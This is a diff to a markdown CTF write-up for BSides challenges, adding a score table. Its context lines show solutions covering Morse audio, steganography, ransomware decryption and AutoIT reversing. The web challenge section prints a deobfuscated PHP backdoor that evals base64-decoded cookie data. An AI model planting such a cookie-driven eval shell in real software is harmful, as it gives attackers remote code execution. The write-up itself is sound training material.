@@ -1,3 +1,18 @@
+```
+Challenge                     Category                    Point
+Search with police        General Information              30
+Vegetables                General Information              30
+Rocker                    General Information              20
+WhoAmi                    General Information              50
+d3c0d3 m3                   Web Security50	               50
+$cript kiddie             Reverse Engineering              50
+Abusing                     Cryptography                   50
+My Router Password              Misc                       50
+Zoom Eye                    Steganography                  50
+Open the safe              smart contract                  75
+Old Style                 Reverse Engineering              150
+Ransom where !              Cryptography                   100
+```
 # General Information : 130 Point in 4 Challenge
 - Rocker : 20 Point
 
@@ -23,7 +38,7 @@ I'm Jack and I have a penetration testing process for Automated Teller Machine a
 I've seen on the internet that I can do this tool with myself with some tools based on open-source hardware, I need something can simulate rubber ducky to inject code and enable PowerShell command or execute a command on Windows...
 What's the name of this piece amid the family names?
 The is Flag `leonardo`
-# 
+#
 # Web Challenge : d3c0d3 m3 50 Point
 - The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/c99.zip) file Which Contain a php code
 ```
@@ -48,7 +63,7 @@ JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSk9PSdmbCcgJiYgJGMoJGEpPjMpe2luaV9z
 $c='count';$a=$_COOKIE;if(reset($a)=='fl' && $c($a)>3){ini_set('error_log', '/dev/null');$k='ag{hidden_in_php}';echo '<'.$k.'>';eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));echo '</'.$k.'>';}
 ```
 - you will see that variable `$a` is `fl` and variable `$k` is `ag{hidden_in_php}` so your flag is `flag{hidden_in_php}`
-# 
+#
 # Steganography : Zoom Eye 50 Point
 - The Challenge is a [zip](https://github.com/X-Vector/CTF/blob/master/Bsides/invokeme.zip) file Which Contain a image They Give us The Password of zip file `squnity`
 - I'm Extract The zip file and found that the image is 13 Mbyte , So There a something hidden in the photo
@@ -68,13 +83,13 @@ Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem
 flag{d3v3l0p3d_f0r_74l3n75}flag{d3v3l0p3d_f0r_74l3n75}
 ```
 - Then The Flag is `flag{d3v3l0p3d_f0r_74l3n75}`
-# 
+#
 # Crypto Challenge : abusing 50 Point
 - The Challenge is a [mp3](https://github.com/X-Vector/CTF/blob/master/Bsides/abusing.mp3) file Which This Sound Like Morse code
 - Go to this [website](https://morsecode.scphillips.com/labs/audio-decoder-adaptive/) then upload mp3 file and you get this result
 ![Morse code](https://github.com/X-Vector/CTF/blob/master/Bsides/morse.png?raw=true)
 - We Play in This Words `ETTE L A G I N M C O D E W E T R U S T` To Get This Result `FLAGINMCODEWETRUST` Then We Submit and we get is wrong Then we add `{}_` to words to be `FLAG{IN_MCODE_TRUST}` and Flag is Correct
-# 
+#
 # Crypto Challenge : Ransom where ! 100 Point
 - The Challenge is a [zip]() file which contain some file and a file called `Ransomware.exe`
 
@@ -164,7 +179,7 @@ public static string Aes(byte[] input, string key, string iv, bool Enc, bool Dec
 - So I call AES Function in this figure `cryptography.Aes(bytes, MyRandomKey, "ABCDEFGHIJ12", false, true)` in 4 Random number and The Right Number is `2281123928613928259`
   ![untitled](https://user-images.githubusercontent.com/46635361/51080747-eb287900-16e9-11e9-90a2-967abc8c6088.png)
 - Then The Flag is `Bsides{IT's_Trivial_Ransomware}`
-# 
+#
 # Reverse Engneering | $cript kiddie 50 Point
 
 - Running the binary will give us this a messagebox showing hex encoded value
@@ -220,7 +235,7 @@ EndFunc
 - and run it using the AutoIT interpreter
 
 ![untitled](https://user-images.githubusercontent.com/46635361/51079752-c88c6500-16d5-11e9-8baa-800c582f9dc8.png)
-# 
+#
 # Reverse Engneering | Old Style 150 Point
 
 - We were given two binaries with zero imports, a pretty common obfuscation technique used by real-life malwares
